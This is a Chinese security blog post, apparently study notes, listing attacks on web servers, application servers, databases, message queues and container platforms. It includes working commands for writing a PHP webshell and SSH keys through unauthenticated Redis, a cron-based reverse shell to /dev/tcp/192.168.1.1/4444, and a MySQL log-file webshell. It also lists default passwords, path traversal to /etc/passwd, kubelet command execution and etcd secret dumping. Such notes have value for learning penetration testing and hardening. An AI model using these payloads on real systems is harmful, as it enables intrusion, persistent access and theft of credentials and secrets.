lass="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">中间件漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-31T14:52:35.000Z" title="发表于 2025-03-31 22:52:35">2025-03-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-22T14:46:54.515Z" title="更新于 2025-04-22 22:46:54">2025-04-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h1><h2 id="web服务器中间件"><a href="#web服务器中间件" class="headerlink" title="web服务器中间件"></a>web服务器中间件</h2><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><ol>
<li>换行解析漏洞：在解析<code>.php</code>文件时，会将<code>.php/x0A</code>当作php文件解析，绕过一些安全策略</li>
<li>目录遍历漏洞：配置错误导致可以通过<code>/../</code>来进行目录遍历。如<code>/../../etc/passw</code></li>
<li>未知扩展名解析:如果后缀名无法解析会自动看向前一个后缀。<code>shell.php.aaa</code></li>
</ol>
<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><ol>
<li>目录遍历文件读取漏洞：配置错误导致访问页面出现<code>Index of /</code>可以看到目录与文件</li>
<li>解析漏洞：<ul>
<li>配置不当解析漏洞：会将<code>test.jpg/.php</code>当作php文件解析</li>
<li><code>%00</code>截断：<code>test.php%00.jpg</code>服务器会保存为test.php但是认为是jpg文件</li>
</ul>
</li>
<li>配置错误CRLF注入：通过<code>\r\n</code>回车换行符对cookie进行篡改，或者执行xss</li>
</ol>
<h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><ol>
<li>PUT文件上传:服务器配置不当，允许客户端通过HTTP PUT请求方法直接上传文件到服务器。可以配合路径遍历绕过限制</li>
<li>解析漏洞<ul>
<li>6.0：iis6.0默认不解析<code>;</code>后的内容，<code>shell.jsp;.jpg</code>,基于文件夹<code>/*.asp/</code>下的文件会被当作asp解析</li>
<li>7.0&#x2F;7.5:任意文件后加<code>/.php</code>服务器就会解析成php</li>
</ul>
</li>
<li>短文件名泄露：利用<code>~</code>枚举文件，请求<code>http://example.com/web.con~1/.aspx</code>。文件存在会返回400 or 403b不存在文件会返回404</li>
<li>远程代码执行：如（CVE-2017-7269 6.0 RCE），通过请求中添加<code>If: &lt;http://target.com/AAAA...[超长字符串]&gt;</code>触发栈溢出，覆盖地址执行恶意代码</li>
<li>http.sys漏洞：ms15-034，可以执行读取内存，蓝屏，ddos攻击</li>
</ol>
<h2 id="应用服务器中间件"><a href="#应用服务器中间件" class="headerlink" title="应用服务器中间件"></a>应用服务器中间件</h2><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><ol>
<li>弱口令：默认密码<code>tomcat/tomcat</code></li>
<li>PUT方法任意文件上传:通过PUT方法上传任意文件。</li>
<li>Ghostcat漏洞：<code>Tomcat AJP</code>协议，可以读取或包含webapp目录下的任意文件。</li>
<li>War包部署后门：将jsp后门打包为war包部署到Tomcat上</li>
</ol>
<h3 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h3><ol>
<li>弱口令：<code>weblogic/weblogic </code></li>
<li>反序列化漏洞：通过发送恶意xml数据给wls-wsat组件</li>
<li>未授权访问控制台：<code>/console</code> <code>/ws_utc/begin.do</code>可能触发文件上传</li>
<li>SSRF漏洞：通过<code>/uddiexplorer/SearchPublicRegistries.jsp?operator=http://192.168.1.100:6379</code>探测内网服务</li>
</ol>
<h3 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h3><ol>
<li>弱口令：<code>admin/admin</code>、<code>jboss/jboss</code></li>
<li>JMX Console未授权访问：访问<code>/jmx-console/</code>、<code>web-console</code></li>
<li>反序列化漏洞:攻击者发送恶意序列化数据到<code>/invoker/readonly</code>，利用JDK原生类（如<code>java.lang.ProcessBuilder</code>）执行命令</li>
<li>HTTP Invoker远程代码执行:攻击者将恶意的序列化对象发送到JMXInvokerServlet（<code>/jmx-invoker/Invoker</code>）执行任意命令</li>
<li>War包部署后门:将jsp后门打包为war包部署到Jboss上</li>
</ol>
<h2 id="数据库中间件"><a href="#数据库中间件" class="headerlink" title="数据库中间件"></a>数据库中间件</h2><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><ul>
<li><p>未授权访问：没有设置密码，可以远程直接连接 <code>redis-cli -h ip</code></p>
</li>
<li><p>WEBSHELL</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="keyword">set</span> dir <span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span></span><br><span class="line">config <span class="keyword">set</span> dbfilename shell.php</span><br><span class="line"><span class="keyword">set</span> x &quot;&lt;?php @eval($_POST[&#x27;caidao&#x27;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
</li>
<li><p>写SSH公钥</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis<span class="operator">-</span>cli <span class="operator">-</span>h <span class="number">192.168</span><span class="number">.43</span><span class="number">.82</span></span><br><span class="line">config <span class="keyword">set</span> dir <span class="operator">/</span>root<span class="operator">/</span>.ssh</span><br><span class="line">config <span class="keyword">set</span> dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
</li>
<li><p>计划任务反弹shell</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis<span class="operator">-</span>cli <span class="operator">-</span>h <span class="number">192.168</span><span class="number">.2</span><span class="number">.6</span></span><br><span class="line"><span class="keyword">set</span> x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.1/4444 0&gt;&amp;1\n&quot;</span><br><span class="line">config <span class="keyword">set</span> dir <span class="operator">/</span>var<span class="operator">/</span>spool<span class="operator">/</span>cron<span class="operator">/</span></span><br><span class="line">config <span class="keyword">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
</li>
<li><p>主从复制RCE：生成一个恶意的主机，让目标变成从机。然后将恶意主机上的exp同步到从机。并将dbfilename设置为exp.so.最后再控制redis从机加载模块执行系统命令</p>
</li>
</ul>
<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><ul>
<li><p>弱口令爆破</p>
</li>
<li><p>提权漏洞：mysql udf提权</p>
</li>
<li><p>日志文件写入WEBSHELL</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 更改日志文件位置</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> &quot;ON&quot;;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;/var/www/html/info.txt&#x27;</span>;</span><br><span class="line"># 开启general_log后会记录用户输入的每条命令并记录到日志中</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h3><ul>
<li>未授权访问：默认没有密码即可进入数据库进行增删改查</li>
</ul>
<h2 id="消息队列中间件"><a href="#消息队列中间件" class="headerlink" title="消息队列中间件"></a>消息队列中间件</h2><h3 id="ActiveMQ"><a href="#ActiveMQ" class="headerlink" title="ActiveMQ"></a>ActiveMQ</h3><ul>
<li>默认密码：<code>admin/admin</code>、<code>user/user</code></li>
<li>反序列化：攻击者通过<code>61616</code>端口（OpenWire协议）发送恶意序列化数据。</li>
<li>文件上传：存在PUT任意文件上传</li>
</ul>
<h3 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h3><ul>
<li>默认密码:<code>guest/guest</code></li>
<li>管理界面未授权访问</li>
</ul>
<h2 id="其他中间件"><a href="#其他中间件" class="headerlink" title="其他中间件"></a>其他中间件</h2><h3 id="FastCGI-PHP-FPM"><a href="#FastCGI-PHP-FPM" class="headerlink" title="FastCGI&#x2F;PHP-FPM"></a>FastCGI&#x2F;PHP-FPM</h3><ul>
<li>未授权访问：9000端口开放</li>
<li>代码执行：通过FastCGI参数设置<code>PHP_VALUE</code>或<code>PHP_ADMIN_VALUE</code>，设置<code>auto_prepend_file = php://input</code>且<code>allow_url_include = On</code>，然后将我们需要执行的代码放在Body中，即可执行任意代码。</li>
</ul>
<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><ul>
<li>未授权API访问：<code>curl https://&lt;API-Server-IP&gt;:6443/api/v1/pods</code></li>
<li>容器逃逸漏洞：CVE-2019-5736</li>
</ul>
<h3 id="Kubernetes"><a href="#Kubernetes" class="headerlink" title="Kubernetes"></a>Kubernetes</h3><ul>
<li><p>API Server未授权访问：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回Pod列表，说明存在未授权访问</span></span><br><span class="line">curl https://&lt;API-Server-IP&gt;:6443/api/v1/pods</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取节点上所有Pod信息</span></span><br><span class="line">curl http://&lt;Node-IP&gt;:10255/pods</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在容器内执行命令</span></span><br><span class="line">curl -k -XPOST &quot;https://&lt;Node-IP&gt;:10250/exec/&lt;namespace&gt;/&lt;pod&gt;/&lt;container&gt;?command=id&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Dashboard 未授权访问</span></span><br><span class="line">http://&lt;Dashboard-IP&gt;:30000</span><br></pre></td></tr></table></figure>
</li>
<li><p>ETCD未授权数据泄露</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">读取所有键值数据（含Secrets）</span></span><br><span class="line">ETCDCTL_API=3 etcdctl --endpoints=http://&lt;etcd-IP&gt;:2379 get / --prefix</span><br></pre></td></tr></table></figure></li>
</ul>
